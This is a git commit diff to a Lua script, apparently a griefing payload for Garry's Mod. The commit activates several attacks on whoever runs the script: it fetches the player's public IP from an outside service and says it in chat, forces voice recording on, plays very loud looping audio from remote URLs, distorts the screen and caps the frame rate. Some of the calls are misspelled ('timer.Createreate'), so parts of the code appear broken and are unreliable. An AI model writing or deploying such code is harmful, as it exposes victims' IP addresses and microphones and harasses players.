2d6dc94255ba26ccfe68dabb974e28ea9b53aaf5
erraticcccc <78512572+erraticcccc@users.noreply.github.com>
2021-02-10 17:14:46 -0800

    Update habol.lua

--- habol.lua
+++ habol.lua
@@ -196,16 +196,16 @@ local function oniichan() --aids copypasta
 end
 -- ALL TIMERS
 _timer.Create("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime())..' is my fps, silly onii-chan >_<')end) -- fps
---timer.Createreate("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
+timer.Createreate("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
 _timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
 --timer.Createreate("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
 _timer.Create('hahasong', .1, 1, function() Song = true end)
---s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
---s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
---s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
---s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
---s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
---timer.Createreate('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
+s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
+s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
+s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
+s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
+s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
+timer.Createreate('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
 s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying anime song
 _timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end) -- annoying anime song timer (basically just makes it loop)
 _timer.Create('paste',0,10000,function()
@@ -246,29 +246,29 @@ _hook.Add('Think','funny',function()
         local result2 = annoying[_math.random(1,88)]
         local cfunnies = funnies[_math.random(1,30)]
         local sresult = annoyings[_math.random(1,13)]
-        --local pSong = CreateSound(LocalPlayer(),sresult)
-        --sound.Add({
-        --    name = "wowow",
-        --   channel = CHAN_STATIC,
-        --    volume = (jpegs^2),
-        --    level = 10000,
-        --    pitch = {50,200},
-        --    sound = sresult
-        --})
-        --_command('pp_mat_overlay',result)
+        local pSong = CreateSound(LocalPlayer(),sresult)
+        sound.Add({
+            name = "wowow",
+           channel = CHAN_STATIC,
+            volume = (jpegs^2),
+            level = 10000,
+            pitch = {50,200},
+            sound = sresult
+        })
+        _command('pp_mat_overlay',result)
         _command('+voicerecord')
-        --_command('pp_mat_overlay_refractamount',tonumber(cfunnies))
+        _command('pp_mat_overlay_refractamount',tonumber(cfunnies))
         _command('pp_texturize',result2)
-        --_command('fps_max','30')
+        _command('fps_max','30')
         --_command('nyan_love')
         --_command('hahaball')
         --_command('status')
-        --pSong:ChangeVolume(100000)
-        --pSong:SetSoundLevel(100000)
-        --pSong:Play()
-        --ply:EmitSound("wowow")
+        pSong:ChangeVolume(100000)
+        pSong:SetSoundLevel(100000)
+        pSong:Play()
+        ply:EmitSound("wowow")
         --_surface.CreateFont(table.Random(funnies),{})
-        --chat.AddText(rgb, cfunnies)
+        chat.AddText(rgb, cfunnies)
         ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)
 
         if _input.IsKeyDown(70) then 
